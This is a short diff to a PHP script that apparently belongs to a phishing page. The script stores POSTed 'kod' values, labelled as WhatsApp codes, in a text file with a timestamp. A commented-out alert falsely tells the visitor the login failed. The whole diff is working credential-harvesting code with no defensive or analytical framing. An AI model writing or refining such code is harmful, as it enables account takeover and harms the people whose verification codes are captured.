@@ -5,15 +5,17 @@ if (isset($_POST['kod'])) {
 
 $save = fopen("kod.txt","a+");
 $kod = $_POST['kod'];
+date_default_timezone_set('Europe/Istanbul');
+$tarih = date('d/m/Y H:i:s');
 $vericekilen = ("
-\e[32m
-	████████████████████████████████████████
-	██
-	██ \e[97mKOD    : \e[32m".$kod."\e[32m
-	██
-	████████████████████████████████████████\e[97m
++-+-+ WHATSAPP CODE +-+-+
 
-	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
+ Tarih         : ".$tarih."
+
+ Kod           : ".$kod."
+
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+");
 fwrite($save,$vericekilen);
 fclose($save);
 //echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";
